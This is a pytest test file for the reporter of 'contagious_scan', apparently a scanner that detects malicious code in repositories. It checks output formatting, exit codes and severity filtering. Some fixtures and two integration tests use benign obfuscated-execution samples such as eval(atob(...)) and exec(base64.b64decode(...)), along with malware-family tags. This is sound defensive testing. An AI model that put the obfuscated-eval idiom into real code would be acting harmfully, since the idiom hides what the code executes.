"""Tests for contagious_scan.reporter module.

Covers output formatting (rich, JSON, plain text) and correct exit code
assignment for various scan result configurations.
"""

from __future__ import annotations

import json
from io import StringIO
from pathlib import Path

import pytest

from contagious_scan.detectors import Finding
from contagious_scan.reporter import (
    EXIT_ERROR,
    EXIT_FINDINGS,
    EXIT_OK,
    OutputFormat,
    Reporter,
    _group_by_severity,
    _truncate_display,
    determine_exit_code,
    render_findings,
)
from contagious_scan.scanner import ScanConfig, ScanResult


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_finding(
    severity: str = "high",
    file_path: str = "src/index.js",
    line_number: int = 10,
    pattern_id: str = "TEST_PATTERN",
    description: str = "Test description",
    matched_text: str = "matched text",
    remediation: str = "Fix it.",
    tags: frozenset[str] = frozenset({"test"}),
) -> Finding:
    """Create a Finding instance with sensible defaults."""
    return Finding(
        severity=severity,
        file_path=file_path,
        line_number=line_number,
        pattern_id=pattern_id,
        description=description,
        matched_text=matched_text,
        remediation=remediation,
        tags=tags,
    )


def _make_result(
    findings: list[Finding] | None = None,
    errors: list[str] | None = None,
    scanned_files: list[str] | None = None,
    skipped_files: list[str] | None = None,
    repository: str = "/test/repo",
    elapsed_seconds: float = 1.0,
) -> ScanResult:
    """Create a ScanResult instance with sensible defaults."""
    return ScanResult(
        repository=repository,
        scan_timestamp="2024-01-01T00:00:00Z",
        findings=findings or [],
        scanned_files=scanned_files or ["file1.js"],
        skipped_files=skipped_files or [],
        errors=errors or [],
        config=ScanConfig(target_path="."),
        elapsed_seconds=elapsed_seconds,
    )


# ---------------------------------------------------------------------------
# OutputFormat enum tests
# ---------------------------------------------------------------------------


class TestOutputFormat:
    """Tests for the OutputFormat enum."""

    def test_from_string_rich(self) -> None:
        assert OutputFormat.from_string("rich") == OutputFormat.RICH

    def test_from_string_json(self) -> None:
        assert OutputFormat.from_string("json") == OutputFormat.JSON

    def test_from_string_plain(self) -> None:
        assert OutputFormat.from_string("plain") == OutputFormat.PLAIN

    def test_from_string_case_insensitive_rich(self) -> None:
        assert OutputFormat.from_string("RICH") == OutputFormat.RICH

    def test_from_string_case_insensitive_json(self) -> None:
        assert OutputFormat.from_string("JSON") == OutputFormat.JSON

    def test_from_string_case_insensitive_plain(self) -> None:
        assert OutputFormat.from_string("Plain") == OutputFormat.PLAIN

    def test_from_string_invalid_raises(self) -> None:
        with pytest.raises(ValueError, match="Unknown output format"):
            OutputFormat.from_string("xml")

    def test_from_string_invalid_mentions_valid_formats(self) -> None:
        with pytest.raises(ValueError) as exc_info:
            OutputFormat.from_string("html")
        assert "rich" in str(exc_info.value).lower() or "json" in str(exc_info.value).lower()

    def test_values_rich(self) -> None:
        assert OutputFormat.RICH.value == "rich"

    def test_values_json(self) -> None:
        assert OutputFormat.JSON.value == "json"

    def test_values_plain(self) -> None:
        assert OutputFormat.PLAIN.value == "plain"

    def test_is_string_subclass(self) -> None:
        assert isinstance(OutputFormat.RICH, str)

    def test_from_string_empty_raises(self) -> None:
        with pytest.raises(ValueError):
            OutputFormat.from_string("")

    def test_all_formats_listed(self) -> None:
        formats = {f.value for f in OutputFormat}
        assert formats == {"rich", "json", "plain"}


# ---------------------------------------------------------------------------
# Exit code constants
# ---------------------------------------------------------------------------


class TestExitCodes:
    """Verify exit code constant values."""

    def test_exit_ok_is_zero(self) -> None:
        assert EXIT_OK == 0

    def test_exit_findings_is_one(self) -> None:
        assert EXIT_FINDINGS == 1

    def test_exit_error_is_two(self) -> None:
        assert EXIT_ERROR == 2

    def test_exit_codes_are_distinct(self) -> None:
        assert EXIT_OK != EXIT_FINDINGS
        assert EXIT_OK != EXIT_ERROR
        assert EXIT_FINDINGS != EXIT_ERROR

    def test_exit_codes_are_ints(self) -> None:
        assert isinstance(EXIT_OK, int)
        assert isinstance(EXIT_FINDINGS, int)
        assert isinstance(EXIT_ERROR, int)


# ---------------------------------------------------------------------------
# Reporter exit code logic
# ---------------------------------------------------------------------------


class TestReporterExitCode:
    """Tests for Reporter._exit_code and determine_exit_code."""

    def test_no_findings_no_errors_returns_ok(self) -> None:
        result = _make_result(findings=[], errors=[])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        assert reporter.render(result) == EXIT_OK

    def test_findings_present_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_critical_finding_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_medium_finding_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="medium")])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_info_finding_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="info")])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_ci_override_returns_ok_even_with_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO(), ci_override=True)
        assert reporter.render(result) == EXIT_OK

    def test_ci_override_with_no_findings_returns_ok(self) -> None:
        result = _make_result(findings=[])
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO(), ci_override=True)
        assert reporter.render(result) == EXIT_OK

    def test_min_severity_high_filters_medium_finding(self) -> None:
        # Only a medium finding, but min_severity=high => no qualifying findings
        result = _make_result(findings=[_make_finding(severity="medium")])
        reporter = Reporter(OutputFormat.PLAIN, min_severity="high", file=StringIO())
        assert reporter.render(result) == EXIT_OK

    def test_min_severity_critical_with_high_finding_ok(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        reporter = Reporter(OutputFormat.PLAIN, min_severity="critical", file=StringIO())
        assert reporter.render(result) == EXIT_OK

    def test_min_severity_critical_with_critical_finding_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        reporter = Reporter(OutputFormat.PLAIN, min_severity="critical", file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_min_severity_medium_with_high_finding_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        reporter = Reporter(OutputFormat.PLAIN, min_severity="medium", file=StringIO())
        assert reporter.render(result) == EXIT_FINDINGS

    def test_errors_with_no_findings_no_scanned_returns_error(self) -> None:
        result = _make_result(
            findings=[],
            errors=["Fatal error"],
            scanned_files=[],
        )
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        code = reporter.render(result)
        assert code == EXIT_ERROR

    def test_errors_with_findings_returns_findings(self) -> None:
        # When there are both errors and findings, findings take priority
        result = _make_result(
            findings=[_make_finding(severity="high")],
            errors=["Some warning"],
        )
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        code = reporter.render(result)
        assert code == EXIT_FINDINGS

    def test_render_returns_int(self) -> None:
        result = _make_result()
        reporter = Reporter(OutputFormat.PLAIN, file=StringIO())
        code = reporter.render(result)
        assert isinstance(code, int)

    def test_determine_exit_code_no_findings(self) -> None:
        result = _make_result(findings=[])
        assert determine_exit_code(result) == EXIT_OK

    def test_determine_exit_code_with_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        assert determine_exit_code(result) == EXIT_FINDINGS

    def test_determine_exit_code_ci_override(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        assert determine_exit_code(result, ci_override=True) == EXIT_OK

    def test_determine_exit_code_min_severity_filter(self) -> None:
        result = _make_result(findings=[_make_finding(severity="medium")])
        assert determine_exit_code(result, min_severity="high") == EXIT_OK

    def test_determine_exit_code_errors_no_findings(self) -> None:
        result = _make_result(
            findings=[],
            errors=["Something broke"],
            scanned_files=[],
        )
        # errors with no findings and no scanned files => EXIT_ERROR
        code = determine_exit_code(result)
        assert code == EXIT_ERROR

    def test_determine_exit_code_with_critical_and_min_critical(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        assert determine_exit_code(result, min_severity="critical") == EXIT_FINDINGS

    def test_determine_exit_code_with_info_and_min_high(self) -> None:
        result = _make_result(findings=[_make_finding(severity="info")])
        assert determine_exit_code(result, min_severity="high") == EXIT_OK


# ---------------------------------------------------------------------------
# JSON output format
# ---------------------------------------------------------------------------


class TestJSONOutput:
    """Tests for JSON output format."""

    def _render_json(self, result: ScanResult, **kwargs: object) -> dict:
        """Render result as JSON and return parsed dict."""
        buf = StringIO()
        reporter = Reporter(OutputFormat.JSON, file=buf, **kwargs)  # type: ignore[arg-type]
        reporter.render(result)
        return json.loads(buf.getvalue())

    def test_output_is_valid_json(self) -> None:
        result = _make_result(findings=[_make_finding()])
        data = self._render_json(result)
        assert isinstance(data, dict)

    def test_output_has_scan_timestamp(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert "scan_timestamp" in data

    def test_output_has_repository(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert "repository" in data

    def test_output_has_total_findings(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert "total_findings" in data

    def test_output_has_findings_list(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert "findings" in data
        assert isinstance(data["findings"], list)

    def test_output_has_severity_summary(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert "severity_summary" in data

    def test_findings_count_matches(self) -> None:
        findings = [_make_finding(severity="critical"), _make_finding(severity="high", line_number=2)]
        result = _make_result(findings=findings)
        data = self._render_json(result)
        assert data["total_findings"] == 2
        assert len(data["findings"]) == 2

    def test_severity_summary_counts(self) -> None:
        findings = [
            _make_finding(severity="critical"),
            _make_finding(severity="critical", line_number=2),
            _make_finding(severity="high", line_number=3),
        ]
        result = _make_result(findings=findings)
        data = self._render_json(result)
        assert data["severity_summary"]["critical"] == 2
        assert data["severity_summary"]["high"] == 1
        assert data["severity_summary"]["medium"] == 0

    def test_severity_summary_all_levels_present(self) -> None:
        result = _make_result(findings=[])
        data = self._render_json(result)
        for level in ["critical", "high", "medium", "info"]:
            assert level in data["severity_summary"]

    def test_min_severity_filters_json_output(self) -> None:
        findings = [
            _make_finding(severity="critical"),
            _make_finding(severity="info", line_number=2),
        ]
        result = _make_result(findings=findings)
        data = self._render_json(result, min_severity="high")
        # Only critical should appear
        assert data["total_findings"] == 1
        assert data["findings"][0]["severity"] == "critical"

    def test_min_severity_filter_in_output(self) -> None:
        result = _make_result()
        data = self._render_json(result, min_severity="high")
        assert data["min_severity_filter"] == "high"

    def test_min_severity_default_info_in_output(self) -> None:
        result = _make_result()
        data = self._render_json(result)
        assert data["min_severity_filter"] == "info"

    def test_finding_keys_in_json(self) -> None:
        result = _make_result(findings=[_make_finding()])
        data = self._render_json(result)
        finding = data["findings"][0]
        expected_keys = {
            "severity", "file", "line", "pattern_id",
            "description", "matched_text", "remediation", "tags",
        }
        assert set(finding.keys()) == expected_keys

    def test_finding_severity_in_json(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        data = self._render_json(result)
        assert data["findings"][0]["severity"] == "critical"

    def test_finding_file_in_json(self) -> None:
        result = _make_result(findings=[_make_finding(file_path="evil/loader.js")])
        data = self._render_json(result)
        assert data["findings"][0]["file"] == "evil/loader.js"

    def test_finding_line_in_json(self) -> None:
        result = _make_result(findings=[_make_finding(line_number=42)])
        data = self._render_json(result)
        assert data["findings"][0]["line"] == 42

    def test_finding_pattern_id_in_json(self) -> None:
        result = _make_result(findings=[_make_finding(pattern_id="MY_PATTERN")])
        data = self._render_json(result)
        assert data["findings"][0]["pattern_id"] == "MY_PATTERN"

    def test_finding_tags_sorted_in_json(self) -> None:
        result = _make_result(
            findings=[_make_finding(tags=frozenset({"zebra", "apple", "mango"}))]
        )
        data = self._render_json(result)
        assert data["findings"][0]["tags"] == ["apple", "mango", "zebra"]

    def test_empty_findings_produces_valid_json(self) -> None:
        result = _make_result(findings=[])
        data = self._render_json(result)
        assert data["total_findings"] == 0
        assert data["findings"] == []

    def test_repository_in_json(self) -> None:
        result = _make_result(repository="/my/repo")
        data = self._render_json(result)
        assert data["repository"] == "/my/repo"

    def test_errors_in_json(self) -> None:
        result = _make_result(errors=["Something went wrong"])
        data = self._render_json(result)
        assert "errors" in data
        assert "Something went wrong" in data["errors"]

    def test_elapsed_seconds_in_json(self) -> None:
        result = _make_result(elapsed_seconds=2.5)
        data = self._render_json(result)
        assert data["elapsed_seconds"] == pytest.approx(2.5)

    def test_json_is_pretty_printed(self) -> None:
        result = _make_result()
        buf = StringIO()
        reporter = Reporter(OutputFormat.JSON, file=buf)
        reporter.render(result)
        output = buf.getvalue()
        # Pretty-printed JSON has newlines
        assert "\n" in output

    def test_json_output_is_string(self) -> None:
        result = _make_result()
        buf = StringIO()
        reporter = Reporter(OutputFormat.JSON, file=buf)
        reporter.render(result)
        assert isinstance(buf.getvalue(), str)

    def test_json_severity_summary_filtered_by_min_severity(self) -> None:
        findings = [
            _make_finding(severity="critical"),
            _make_finding(severity="medium", line_number=2),
        ]
        result = _make_result(findings=findings)
        data = self._render_json(result, min_severity="high")
        # Only critical qualifies for min_severity=high
        assert data["severity_summary"]["critical"] == 1
        assert data["severity_summary"]["medium"] == 0


# ---------------------------------------------------------------------------
# Plain text output format
# ---------------------------------------------------------------------------


class TestPlainOutput:
    """Tests for plain text output format."""

    def _render_plain(self, result: ScanResult, **kwargs: object) -> str:
        """Render result as plain text and return the string."""
        buf = StringIO()
        reporter = Reporter(OutputFormat.PLAIN, file=buf, **kwargs)  # type: ignore[arg-type]
        reporter.render(result)
        return buf.getvalue()

    def test_output_is_string(self) -> None:
        result = _make_result()
        output = self._render_plain(result)
        assert isinstance(output, str)

    def test_output_not_empty(self) -> None:
        result = _make_result()
        output = self._render_plain(result)
        assert len(output) > 0

    def test_output_contains_repository(self) -> None:
        result = _make_result(repository="/path/to/repo")
        output = self._render_plain(result)
        assert "/path/to/repo" in output

    def test_output_contains_timestamp(self) -> None:
        result = _make_result()
        output = self._render_plain(result)
        assert "2024-01-01T00:00:00Z" in output

    def test_output_contains_finding_severity_critical(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        output = self._render_plain(result)
        assert "CRITICAL" in output

    def test_output_contains_finding_severity_high(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        output = self._render_plain(result)
        assert "HIGH" in output

    def test_output_contains_finding_severity_medium(self) -> None:
        result = _make_result(findings=[_make_finding(severity="medium")])
        output = self._render_plain(result)
        assert "MEDIUM" in output

    def test_output_contains_finding_severity_info(self) -> None:
        result = _make_result(findings=[_make_finding(severity="info")])
        output = self._render_plain(result)
        assert "INFO" in output

    def test_output_contains_pattern_id(self) -> None:
        result = _make_result(findings=[_make_finding(pattern_id="MY_PATTERN")])
        output = self._render_plain(result)
        assert "MY_PATTERN" in output

    def test_output_contains_file_path(self) -> None:
        result = _make_result(findings=[_make_finding(file_path="evil/loader.js")])
        output = self._render_plain(result)
        assert "evil/loader.js" in output

    def test_output_no_findings_message(self) -> None:
        result = _make_result(findings=[])
        output = self._render_plain(result)
        assert "No findings" in output

    def test_output_contains_errors(self) -> None:
        result = _make_result(errors=["Clone failed"])
        output = self._render_plain(result)
        assert "Clone failed" in output

    def test_output_contains_remediation(self) -> None:
        result = _make_result(
            findings=[_make_finding(remediation="Remove the evil code.")]
        )
        output = self._render_plain(result)
        assert "Remove the evil code." in output

    def test_output_contains_description(self) -> None:
        result = _make_result(
            findings=[_make_finding(description="Suspicious eval pattern detected")]
        )
        output = self._render_plain(result)
        assert "Suspicious eval pattern detected" in output

    def test_no_ansi_codes_in_plain(self) -> None:
        import re
        result = _make_result(findings=[_make_finding(severity="critical")])
        output = self._render_plain(result)
        ansi_pattern = re.compile(r"\x1b\[[0-9;]*m")
        assert not ansi_pattern.search(output), "Plain output must not contain ANSI codes"

    def test_min_severity_filter_excludes_info_when_critical_only(self) -> None:
        findings = [
            _make_finding(severity="critical", pattern_id="CRIT_PAT"),
            _make_finding(severity="info", pattern_id="INFO_PAT", line_number=2),
        ]
        result = _make_result(findings=findings)
        output = self._render_plain(result, min_severity="critical")
        assert "CRIT_PAT" in output
        assert "INFO_PAT" not in output

    def test_min_severity_filter_includes_all_when_info(self) -> None:
        findings = [
            _make_finding(severity="critical", pattern_id="CRIT_PAT"),
            _make_finding(severity="info", pattern_id="INFO_PAT", line_number=2),
        ]
        result = _make_result(findings=findings)
        output = self._render_plain(result, min_severity="info")
        assert "CRIT_PAT" in output
        assert "INFO_PAT" in output

    def test_finding_details_section(self) -> None:
        result = _make_result(findings=[_make_finding(pattern_id="DETAIL_PAT")])
        output = self._render_plain(result)
        assert "FINDING DETAILS" in output
        assert "DETAIL_PAT" in output

    def test_multiple_findings_numbered(self) -> None:
        findings = [
            _make_finding(severity="critical", line_number=1),
            _make_finding(severity="high", line_number=2),
            _make_finding(severity="medium", line_number=3),
        ]
        result = _make_result(findings=findings)
        output = self._render_plain(result)
        assert "[1]" in output
        assert "[2]" in output
        assert "[3]" in output

    def test_output_contains_matched_text(self) -> None:
        result = _make_result(
            findings=[_make_finding(matched_text="eval(atob(x))")]
        )
        output = self._render_plain(result)
        assert "eval(atob(x))" in output

    def test_output_contains_elapsed_seconds(self) -> None:
        result = _make_result(elapsed_seconds=3.14)
        output = self._render_plain(result)
        assert "3.14" in output

    def test_output_contains_files_scanned_count(self) -> None:
        result = _make_result(scanned_files=["a.js", "b.py", "c.json"])
        output = self._render_plain(result)
        assert "3" in output

    def test_output_header_separator(self) -> None:
        result = _make_result()
        output = self._render_plain(result)
        assert "=" * 20 in output

    def test_multiple_errors_all_present(self) -> None:
        result = _make_result(
            errors=["Error one", "Error two", "Error three"],
            scanned_files=[],
        )
        output = self._render_plain(result)
        assert "Error one" in output
        assert "Error two" in output
        assert "Error three" in output

    def test_finding_tags_in_details(self) -> None:
        result = _make_result(
            findings=[_make_finding(tags=frozenset({"rat", "beavertail"}))]
        )
        output = self._render_plain(result)
        # Tags should appear in the details section
        assert "rat" in output or "beavertail" in output

    def test_line_number_in_output(self) -> None:
        result = _make_result(findings=[_make_finding(line_number=99)])
        output = self._render_plain(result)
        assert "99" in output


# ---------------------------------------------------------------------------
# Rich output format
# ---------------------------------------------------------------------------


class TestRichOutput:
    """Tests for rich output format."""

    def _render_rich(self, result: ScanResult, **kwargs: object) -> str:
        """Render result as rich output and return the string."""
        buf = StringIO()
        reporter = Reporter(OutputFormat.RICH, file=buf, **kwargs)  # type: ignore[arg-type]
        reporter.render(result)
        return buf.getvalue()

    def test_output_is_string(self) -> None:
        result = _make_result()
        output = self._render_rich(result)
        assert isinstance(output, str)

    def test_output_not_empty(self) -> None:
        result = _make_result(findings=[_make_finding()])
        output = self._render_rich(result)
        assert len(output) > 0

    def test_output_contains_repository(self) -> None:
        result = _make_result(repository="/path/to/repo")
        output = self._render_rich(result)
        assert "/path/to/repo" in output

    def test_no_findings_message(self) -> None:
        result = _make_result(findings=[])
        output = self._render_rich(result)
        assert "No findings" in output

    def test_findings_in_output(self) -> None:
        result = _make_result(findings=[_make_finding(pattern_id="EVIL_PAT")])
        output = self._render_rich(result)
        assert "EVIL_PAT" in output

    def test_critical_remediation_section(self) -> None:
        result = _make_result(
            findings=[
                _make_finding(
                    severity="critical",
                    remediation="Delete the evil file.",
                )
            ]
        )
        output = self._render_rich(result)
        assert "Delete the evil file." in output

    def test_errors_in_output(self) -> None:
        result = _make_result(errors=["Permission denied"])
        output = self._render_rich(result)
        assert "Permission denied" in output

    def test_severity_label_critical_present(self) -> None:
        findings = [_make_finding(severity="critical", line_number=1)]
        result = _make_result(findings=findings)
        output = self._render_rich(result)
        assert "CRITICAL" in output

    def test_severity_label_high_present(self) -> None:
        findings = [_make_finding(severity="high", line_number=2)]
        result = _make_result(findings=findings)
        output = self._render_rich(result)
        assert "HIGH" in output

    def test_file_path_in_output(self) -> None:
        result = _make_result(findings=[_make_finding(file_path="src/evil.js")])
        output = self._render_rich(result)
        assert "src/evil.js" in output

    def test_pattern_id_in_output(self) -> None:
        result = _make_result(findings=[_make_finding(pattern_id="BT_JS_EVAL_ATOB")])
        output = self._render_rich(result)
        assert "BT_JS_EVAL_ATOB" in output

    def test_description_in_output(self) -> None:
        result = _make_result(
            findings=[_make_finding(description="Suspicious eval detected")]
        )
        output = self._render_rich(result)
        assert "Suspicious eval detected" in output

    def test_multiple_findings_all_in_output(self) -> None:
        findings = [
            _make_finding(pattern_id="PAT_A", line_number=1),
            _make_finding(pattern_id="PAT_B", line_number=2),
        ]
        result = _make_result(findings=findings)
        output = self._render_rich(result)
        assert "PAT_A" in output
        assert "PAT_B" in output

    def test_render_returns_int(self) -> None:
        result = _make_result()
        buf = StringIO()
        reporter = Reporter(OutputFormat.RICH, file=buf)
        code = reporter.render(result)
        assert isinstance(code, int)

    def test_min_severity_filter_affects_output(self) -> None:
        findings = [
            _make_finding(severity="critical", pattern_id="CRIT_PAT"),
            _make_finding(severity="info", pattern_id="INFO_PAT", line_number=2),
        ]
        result = _make_result(findings=findings)
        output = self._render_rich(result, min_severity="critical")
        assert "CRIT_PAT" in output
        assert "INFO_PAT" not in output

    def test_ci_override_exit_zero(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        buf = StringIO()
        reporter = Reporter(OutputFormat.RICH, file=buf, ci_override=True)
        code = reporter.render(result)
        assert code == EXIT_OK

    def test_contagious_scan_label_in_output(self) -> None:
        result = _make_result()
        output = self._render_rich(result)
        # The reporter's header panel has 'contagious_scan'
        assert "contagious" in output.lower() or "scan" in output.lower()


# ---------------------------------------------------------------------------
# render_to_string tests
# ---------------------------------------------------------------------------


class TestRenderToString:
    """Tests for Reporter.render_to_string."""

    def test_returns_string(self) -> None:
        result = _make_result()
        reporter = Reporter(OutputFormat.PLAIN)
        output = reporter.render_to_string(result)
        assert isinstance(output, str)

    def test_string_not_empty(self) -> None:
        result = _make_result()
        reporter = Reporter(OutputFormat.PLAIN)
        output = reporter.render_to_string(result)
        assert len(output) > 0

    def test_json_render_to_string_is_valid_json(self) -> None:
        result = _make_result(findings=[_make_finding()])
        reporter = Reporter(OutputFormat.JSON)
        output = reporter.render_to_string(result)
        data = json.loads(output)
        assert data["total_findings"] == 1

    def test_plain_render_to_string_contains_content(self) -> None:
        result = _make_result(repository="/my/repo")
        reporter = Reporter(OutputFormat.PLAIN)
        output = reporter.render_to_string(result)
        assert "/my/repo" in output

    def test_rich_render_to_string_contains_content(self) -> None:
        result = _make_result(repository="/rich/repo")
        reporter = Reporter(OutputFormat.RICH)
        output = reporter.render_to_string(result)
        assert "/rich/repo" in output

    def test_render_to_string_does_not_write_to_file(self) -> None:
        """render_to_string should not write to the reporter's file handle."""
        result = _make_result(findings=[_make_finding()])
        original_buf = StringIO()
        reporter = Reporter(OutputFormat.PLAIN, file=original_buf)
        reporter.render_to_string(result)
        # Nothing written to original_buf
        assert original_buf.getvalue() == ""

    def test_render_to_string_respects_min_severity(self) -> None:
        findings = [
            _make_finding(severity="critical", pattern_id="CRIT_PAT"),
            _make_finding(severity="info", pattern_id="INFO_PAT", line_number=2),
        ]
        result = _make_result(findings=findings)
        reporter = Reporter(OutputFormat.PLAIN, min_severity="critical")
        output = reporter.render_to_string(result)
        assert "CRIT_PAT" in output
        assert "INFO_PAT" not in output

    def test_render_to_string_json_multiple_findings(self) -> None:
        findings = [
            _make_finding(severity="critical", line_number=1),
            _make_finding(severity="high", line_number=2),
            _make_finding(severity="medium", line_number=3),
        ]
        result = _make_result(findings=findings)
        reporter = Reporter(OutputFormat.JSON)
        output = reporter.render_to_string(result)
        data = json.loads(output)
        assert data["total_findings"] == 3


# ---------------------------------------------------------------------------
# render_findings convenience function
# ---------------------------------------------------------------------------


class TestRenderFindings:
    """Tests for the module-level render_findings function."""

    def test_returns_int(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, file=buf)
        assert isinstance(code, int)

    def test_no_findings_returns_ok(self) -> None:
        result = _make_result(findings=[])
        buf = StringIO()
        code = render_findings(result, file=buf)
        assert code == EXIT_OK

    def test_with_findings_returns_findings(self) -> None:
        result = _make_result(findings=[_make_finding(severity="high")])
        buf = StringIO()
        code = render_findings(result, file=buf)
        assert code == EXIT_FINDINGS

    def test_accepts_string_format_rich(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format="rich", file=buf)
        assert isinstance(code, int)

    def test_accepts_string_format_json(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format="json", file=buf)
        assert isinstance(code, int)

    def test_accepts_string_format_plain(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format="plain", file=buf)
        assert isinstance(code, int)

    def test_accepts_enum_format_rich(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format=OutputFormat.RICH, file=buf)
        assert isinstance(code, int)

    def test_accepts_enum_format_json(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format=OutputFormat.JSON, file=buf)
        assert isinstance(code, int)

    def test_accepts_enum_format_plain(self) -> None:
        result = _make_result()
        buf = StringIO()
        code = render_findings(result, output_format=OutputFormat.PLAIN, file=buf)
        assert isinstance(code, int)

    def test_invalid_format_raises(self) -> None:
        result = _make_result()
        with pytest.raises(ValueError):
            render_findings(result, output_format="xml", file=StringIO())

    def test_ci_override_always_zero(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        buf = StringIO()
        code = render_findings(result, file=buf, ci_override=True)
        assert code == EXIT_OK

    def test_min_severity_filters_exit_code(self) -> None:
        result = _make_result(findings=[_make_finding(severity="medium")])
        buf = StringIO()
        code = render_findings(result, file=buf, min_severity="high")
        assert code == EXIT_OK

    def test_min_severity_critical_with_critical_finding(self) -> None:
        result = _make_result(findings=[_make_finding(severity="critical")])
        buf = StringIO()
        code = render_findings(result, file=buf, min_severity="critical")
        assert code == EXIT_FINDINGS

    def test_output_written_to_file(self) -> None:
        result = _make_result(findings=[_make_finding()])
        buf = StringIO()
        render_findings(result, output_format="plain", file=buf)
        assert len(buf.getvalue()) > 0

    def test_json_output_is_valid(self) -> None:
        result = _make_result(findings=[_make_finding()])
        buf = StringIO()
        render_findings(result, output_format="json", file=buf)
        data = json.loads(buf.getvalue())
        assert "findings" in data


# ---------------------------------------------------------------------------
# Helper function tests
# ---------------------------------------------------------------------------


class TestHelpers:
    """Tests for module-level helper functions."""

    def test_group_by_severity_critical(self) -> None:
        findings = [
            _make_finding(severity="critical"),
            _make_finding(severity="critical", line_number=2),
            _make_finding(severity="high", line_number=3),
        ]
        grouped = _group_by_severity(findings)
        assert len(grouped["critical"]) == 2
        assert len(grouped["high"]) == 1
        assert "medium" not in grouped

    def test_group_by_severity_empty(self) -> None:
        grouped = _group_by_severity([])
        assert grouped == {}

    def test_group_by_severity_single(self) -> None:
        findings = [_make_finding(severity="info")]
        grouped = _group_by_severity(findings)
        assert len(grouped["info"]) == 1

    def test_group_by_severity_all_levels(self) -> None:
        findings = [
            _make_finding(severity="critical", line_number=1),
            _make_finding(severity="high", line_number=2),
            _make_finding(severity="medium", line_number=3),
            _make_finding(severity="info", line_number=4),
        ]
        grouped = _group_by_severity(findings)
        assert len(grouped["critical"]) == 1
        assert len(grouped["high"]) == 1
        assert len(grouped["medium"]) == 1
        assert len(grouped["info"]) == 1

    def test_group_by_severity_returns_dict(self) -> None:
        grouped = _group_by_severity([])
        assert isinstance(grouped, dict)

    def test_truncate_display_short_string(self) -> None:
        assert _truncate_display("hello", 20) == "hello"

    def test_truncate_display_long_string(self) -> None:
        result = _truncate_display("a" * 100, 20)
        assert len(result) == 20
        assert result.endswith("...")

    def test_truncate_display_exact_length(self) -> None:
        text = "a" * 20
        assert _truncate_display(text, 20) == text

    def test_truncate_display_strips_whitespace(self) -> None:
        assert _truncate_display("  hello  ", 20) == "hello"

    def test_truncate_display_empty_string(self) -> None:
        assert _truncate_display("", 10) == ""

    def test_truncate_display_one_over_limit(self) -> None:
        text = "a" * 21
        result = _truncate_display(text, 20)
        assert result.endswith("...")
        assert len(result) == 20

    def test_truncate_display_preserves_content(self) -> None:
        text = "hello world"
        result = _truncate_display(text, 50)
        assert result == "hello world"

    def test_truncate_display_with_special_chars(self) -> None:
        text = "eval(atob('SGVsbG8='))"
        result = _truncate_display(text, 15)
        assert result.endswith("...")
        assert len(result) == 15

    def test_group_by_severity_groups_findings_correctly(self) -> None:
        f1 = _make_finding(severity="high", line_number=1)
        f2 = _make_finding(severity="high", line_number=2)
        f3 = _make_finding(severity="medium", line_number=3)
        grouped = _group_by_severity([f1, f2, f3])
        assert f1 in grouped["high"]
        assert f2 in grouped["high"]
        assert f3 in grouped["medium"]


# ---------------------------------------------------------------------------
# Integration: scan result from Scanner
# ---------------------------------------------------------------------------


class TestReporterWithRealScanResult:
    """Integration tests using actual ScanResult objects from the scanner."""

    def test_render_plain_with_real_result(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "loader.js").write_text(
            "eval(atob('SGVsbG8='));\n"
        )

        result = scan(tmp_path, min_severity="info")
        buf = StringIO()
        reporter = Reporter(OutputFormat.PLAIN, min_severity="info", file=buf)
        code = reporter.render(result)
        output = buf.getvalue()

        assert isinstance(output, str)
        assert isinstance(code, int)

    def test_render_json_with_real_result(self, tmp_path: Path) -> None:
        from contagious_scan.scanner import scan

        (tmp_path / "stager.py").write_text(
            "import base64\nexec(base64.b64decode('aGVsbG8='))\n"
        )

        result = scan(tmp_path, min_severity="info")
        reporter = Reporter(OutputFormat.JSON)
        output = reporter.render_to_string(result)
        data = json.loads(output)
        assert "findings" in data

